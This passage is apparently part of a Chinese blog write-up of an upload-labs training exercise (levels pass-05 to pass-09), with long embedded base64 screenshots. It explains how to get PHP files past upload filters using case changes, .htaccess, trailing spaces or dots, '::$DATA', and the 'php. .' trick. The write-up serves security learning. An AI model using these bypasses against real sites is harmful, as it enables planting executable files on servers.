HAABoiMkbOwAAANSDsQMAADQExg4AANAQGDsAAEBDYOwAAAANgbEDAAA0BMYOAADQEBg7AABAQ2DsAAAADYGxAwAANATGDgAA0BAYOwAAQENg7AAAAA2BsQMAADTExIz9QLd5Rv+mdSdbhzeS8gAAAPAGV3T/D6eX8Oap2xBAAAAAAElFTkSuQmCC">img</a>使用这种写法可以精准解析该文件名的文件</p>
<h5 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h5><p>通过对源码的阅读,发现少了字母一律转换成小写的代码,所以可以使用phP进行绕过同理使用.htaccess文件也可进行大写绕过</p>
<h5 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h5><p>通过尝试发现空格即可绕过,通过对源码的阅读印证了想法,未在源码中添加首尾去空的功能</p>
<h5 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h5><p>本题禁止上传所有带有可以解析的后缀的文件利用在文件名末尾添加点绕过没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：pass-08::$DATA绕过**没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过：<img src="data:image/png;base64,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" alt="img"></p>
<h5 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h5><p>利用.加空格绕过代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过<img src="data:image/png;base64,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